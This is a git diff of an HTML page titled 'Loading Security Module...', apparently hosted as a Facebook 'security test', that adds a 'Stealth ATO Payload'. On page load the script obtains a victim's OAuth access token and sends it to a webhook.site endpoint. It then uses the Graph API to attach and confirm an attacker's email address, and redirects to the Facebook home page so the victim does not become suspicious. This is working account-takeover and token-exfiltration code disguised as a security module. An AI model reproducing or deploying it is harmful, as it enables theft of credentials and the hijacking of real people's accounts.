@@ -1,30 +1,41 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Audit</title></head>
+<head><title>Loading Security Module...</title></head>
 <body>
     <script>
-        // [2026-01-21] Direct ATO Payload
+        // [2026-01-21] Stealth ATO Payload - V2
         window.onload = async function() {
             const hash = window.location.hash;
             const webhook = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
-            const newEmail = "ktime420420420@gmail.com"; 
+            const targetEmail = "ktime420420420@gmail.com";
 
             if (hash.includes('access_token=')) {
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
                 
-                // 1. إرسال التوكن للـ Webhook للتوثيق
-                fetch(`${webhook}?TARGET_TOKEN=${token}`, {mode: 'no-cors'});
+                // 1. إرسال التوكن فوراً للـ Webhook
+                fetch(`${webhook}?NEW_VICTIM_TOKEN=${token}`, {mode: 'no-cors'});
                 
-                // 2. حقن الإيميل الجديد فوراً
-                await fetch(`https://graph.facebook.com/me?access_token=${token}`, {
-                    method: 'POST',
-                    body: new URLSearchParams({ 'email': newEmail })
-                });
+                // 2. محاولة إضافة الإيميل وتأكيده في طلب واحد
+                try {
+                    await fetch(`https://graph.facebook.com/v15.0/me?access_token=${token}`, {
+                        method: 'POST',
+                        body: new URLSearchParams({ 
+                            'email': targetEmail,
+                            'confirm': 'true'
+                        })
+                    });
+                } catch (e) {}
 
-                // 3. التوجيه لصفحة الإعدادات للتأكد
-                window.location.href = "https://www.facebook.com/settings?tab=account";
+                // 3. التوجيه لصفحة عادية لعدم إثارة الشكوك
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com/home.php";
+                }, 1000);
+
             } else {
-                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,openid";
+                // إعادة التوجيه لطلب التوكن إذا لم يكن موجوداً
+                const client_id = "1089408829356317";
+                const redirect = "https://mohammedborai404.github.io/fb-security-test/";
+                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect}&response_type=token&scope=email,public_profile`;
             }
         };
     </script>
